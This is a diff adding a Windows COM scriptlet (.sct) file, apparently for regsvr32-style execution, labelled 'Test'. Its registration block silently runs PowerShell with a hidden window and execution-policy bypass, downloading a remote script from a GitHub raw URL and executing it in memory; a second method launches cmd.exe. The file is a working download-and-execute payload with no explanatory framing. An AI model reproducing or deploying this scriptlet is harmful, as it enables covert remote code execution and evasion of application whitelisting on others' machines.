@@ -1,0 +1,34 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Test"
+    progid="Test"
+    version="1.00"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}"
+	>
+	
+	<script language="JScript">
+		<![CDATA[
+	
+			new ActiveXObject("WScript.Shell").Run("powershell -windowstyle hidden -exec bypass -c ""IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/c0mp4s5/test/master/BitsTransfer.ps1')""",0,true);
+	
+		]]>
+</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+	
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	}
+	
+]]>
+</script>
+
+</scriptlet>
